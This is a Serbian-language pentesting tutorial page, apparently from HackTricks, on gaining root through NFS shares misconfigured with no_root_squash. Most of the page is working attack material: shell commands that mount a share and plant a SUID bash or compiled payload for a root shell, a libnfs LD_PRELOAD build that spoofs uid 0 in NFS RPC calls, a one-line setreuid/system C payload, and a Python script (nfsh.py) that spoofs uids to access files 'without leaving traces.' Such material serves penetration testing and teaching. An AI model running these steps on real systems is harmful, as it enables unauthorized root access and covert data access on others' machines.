{{#include ../../banners/hacktricks-training.md}}

# Osnovne informacije o squashingu

NFS obično (posebno na linuxu) veruje u navedeni `uid` i `gid` od strane klijenta koji se povezuje za pristup datotekama (ako se ne koristi kerberos). Međutim, postoje neka podešavanja koja se mogu postaviti na serveru da **promene ovo ponašanje**:

- **`all_squash`**: Squashuje sve pristupe mapirajući svakog korisnika i grupu na **`nobody`** (65534 unsigned / -2 signed). Stoga, svako je `nobody` i nijedan korisnik se ne koristi.
- **`root_squash`/`no_all_squash`**: Ovo je podrazumevano na Linuxu i **samo squashuje pristup sa uid 0 (root)**. Stoga, svaki `UID` i `GID` se veruje, ali `0` se squashuje na `nobody` (tako da nije moguća root impersonacija).
- **`no_root_squash`**: Ova konfiguracija, ako je omogućena, čak ni ne squashuje root korisnika. To znači da ako montirate direktorijum sa ovom konfiguracijom, možete mu pristupiti kao root.

U **/etc/exports** datoteci, ako pronađete neki direktorijum koji je konfigurisan kao **no_root_squash**, tada možete **pristupiti** njemu **kao klijent** i **pisati unutar** tog direktorijuma **kao** da ste lokalni **root** mašine.

Za više informacija o **NFS** proverite:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Eskalacija privilegija

## Daljinski exploit

Opcija 1 koristeći bash:
- **Montiranje tog direktorijuma** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle **/bin/bash** binarnog fajla i davanje mu **SUID** prava, i **izvršavanje** tog bash binarnog fajla sa žrtvinske mašine.
- Imajte na umu da da biste bili root unutar NFS deljenja, **`no_root_squash`** mora biti konfigurisan na serveru.
- Međutim, ako nije omogućeno, mogli biste eskalirati na drugog korisnika kopirajući binarni fajl na NFS deljenje i dajući mu SUID dozvolu kao korisniku na koji želite da se eskalirate.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Opcija 2 koristeći C kompajlirani kod:
- **Montiranje te direktorije** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle našeg kompajliranog payload-a koji će zloupotrebiti SUID dozvolu, dati mu **SUID** prava, i **izvršiti sa žrtvinske** mašine taj binarni fajl (ovde možete pronaći neke [C SUID payload-e](payloads-to-execute.md#c)).
- Iste restrikcije kao pre
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokalni Eksploit

> [!NOTE]
> Imajte na umu da ako možete da kreirate **tunel sa vašeg računara na računar žrtve, još uvek možete koristiti Remote verziju da iskoristite ovu eskalaciju privilegija tunelovanjem potrebnih portova**.\
> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **zloupotrebite ovaj trik**.\
> Još jedan neophodan uslov za rad eksploata je da **izvoz unutar `/etc/export`** **mora koristiti `insecure` flag**.\
> --_Nisam siguran da li će ovaj trik raditi ako `/etc/export` ukazuje na IP adresu_--

## Osnovne Informacije

Scenario uključuje eksploataciju montiranog NFS dela na lokalnom računaru, koristeći grešku u NFSv3 specifikaciji koja omogućava klijentu da specificira svoj uid/gid, potencijalno omogućavajući neovlašćen pristup. Eksploatacija uključuje korišćenje [libnfs](https://github.com/sahlberg/libnfs), biblioteke koja omogućava falsifikovanje NFS RPC poziva.

### Kompilacija Biblioteke

Koraci za kompilaciju biblioteke mogu zahtevati prilagođavanja u zavisnosti od verzije kernela. U ovom specifičnom slučaju, fallocate syscalls su bili komentarisani. Proces kompilacije uključuje sledeće komande:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Izvođenje Eksploata

Eksploit uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na deljenje sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:

1. **Kompajlirajte kod eksploata:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Postavite exploit na deljenje i izmenite njegove dozvole lažirajući uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Izvršite eksploataciju da biste dobili root privilegije:**
```bash
/mnt/share/a.out
#root
```
## Bonus: NFShell za prikriveni pristup datotekama

Kada se dobije root pristup, za interakciju sa NFS deljenjem bez promene vlasništva (da bi se izbegli tragovi), koristi se Python skripta (nfsh.py). Ova skripta podešava uid da odgovara onom datoteke koja se pristupa, omogućavajući interakciju sa datotekama na deljenju bez problema sa dozvolama:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Pokreni kao:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
